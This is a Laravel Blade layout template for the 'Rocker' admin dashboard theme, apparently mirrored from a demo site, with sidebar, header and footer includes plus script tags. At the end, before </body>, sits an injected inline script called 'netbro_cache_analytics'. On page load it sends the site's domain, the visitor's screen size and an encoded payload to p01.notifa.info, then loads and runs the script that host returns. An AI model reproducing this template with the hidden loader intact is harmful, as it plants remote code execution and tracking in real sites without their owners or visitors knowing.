<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from codervent.com/rocker/color-version/pages-blank-page.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:59 GMT -->
@include ('layouts.head')

<body>

<!-- Start wrapper-->
<div id="wrapper">

    <!--Start sidebar-wrapper-->
@include('layouts.sidebar')
<!--End sidebar-wrapper-->

    <!--Start topbar header-->
@include('layouts.header')
<!--End topbar header-->

    <div class="clearfix"></div>

    <div class="content-wrapper">
        <div class="container-fluid">
            <!-- Breadcrumb-->
            <div class="row pt-2 pb-2">
                <div class="col-sm-9">
                    <h4 class="page-title">@yield('judul-page')</h4>
                    <ol class="breadcrumb">
                        <li class="breadcrumb-item"><a href="javaScript:void();">Rocker</a></li>
                        <li class="breadcrumb-item"><a href="javaScript:void();">Pages</a></li>
                        <li class="breadcrumb-item active" aria-current="page">Blank Page</li>
                    </ol>
                </div>
                <div class="col-sm-3">
                    <div class="btn-group float-sm-right">
                        <button type="button" class="btn btn-outline-primary waves-effect waves-light"><i class="fa fa-cog mr-1"></i> Setting</button>
                        <button type="button" class="btn btn-outline-primary dropdown-toggle dropdown-toggle-split waves-effect waves-light" data-toggle="dropdown">
                            <span class="caret"></span>
                        </button>
                        <div class="dropdown-menu">
                            <a href="javaScript:void();" class="dropdown-item">Action</a>
                            <a href="javaScript:void();" class="dropdown-item">Another action</a>
                            <a href="javaScript:void();" class="dropdown-item">Something else here</a>
                            <div class="dropdown-divider"></div>
                            <a href="javaScript:void();" class="dropdown-item">Separated link</a>
                        </div>
                    </div>
                </div>
            </div>
            <!-- End Breadcrumb-->
            <div class="row">
                <div class="col-lg-12">
                    <div style="height:600px"> <!--Please remove the height before using this page-->
                        @yield('content')
                    </div>
                </div>
            </div>

        </div>
        <!-- End container-fluid-->

    </div><!--End content-wrapper-->
    <!--Start Back To Top Button-->
    <a href="javaScript:void();" class="back-to-top"><i class="fa fa-angle-double-up"></i> </a>
    <!--End Back To Top Button-->

    <!--Start footer-->
    <footer class="footer">
        <div class="container">
            <div class="text-center">
                Copyright © 2018 Rocker Admin
            </div>
        </div>
    </footer>
    <!--End footer-->

</div><!--End wrapper-->

@include('sweetalert::alert')
<!-- Bootstrap core JavaScript-->
<script src="{{URL::to('assets/js/jquery.min.js')}}"></script>
<script src="{{URL::to('assets/js/popper.min.js')}}"></script>
<script src="{{URL::to('assets/js/bootstrap.min.js')}}"></script>

<!-- simplebar js -->
<script src="{{URL::to('assets/plugins/simplebar/js/simplebar.js')}}"></script>
<!-- waves effect js -->
<script src="{{URL::to('assets/js/waves.js')}}"></script>
<!-- sidebar-menu js -->
<script src="{{URL::to('assets/js/sidebar-menu.js')}}"></script>
<!-- Custom scripts -->
<script src="{{URL::to('assets/js/app-script.js')}}"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKujWFAQR51fO%2bPm6qO5rwZXo5YjPH6qDtaGM5W6zt0wQjFcbCxKMWzWePB%2f%2fmL05ZfCIzSuNT8TjNA0RvFHxjvpQyDy%2b0nwjEYjkMqXyJnKEcCkYiY0wTpoVkPxy63FCOh7EIAC02C3AAfGuDbybG4jKM8yv7OMn83eoyJZKtSx%2fKBLmcnolqCIokeH90TBi7jNSeVc6FiEq%2bAedoFyijdCS7OPABofv2vd3QlcJ7A6ptffzdgA8s4QS%2fhBtVfNgbibWCqktX7PvSTzMPMy9IMDM4UKk9UgiG%2fwpbKmJ0gsZdUC0BZdjam%2bCKy%2fs29mUdwqXSFdSoB8bm9vzwB9aqXHXw4oGWi4Ubi1yc1R%2bd%2fU6XwWizqXDjRFQV80f4d1nHytNTun4vFBoYTQq7oQBg2NLTiyugl1cBEfGFoWYu6OtemDlfnHIl4HCoQle82LjnsKEjsHK6YS1%2bNa%2fNHfs9XoEz5DwV7YgBL237jtvcrESrwQEXmnXr1Mk" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from codervent.com/rocker/color-version/pages-blank-page.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:59 GMT -->
</html>
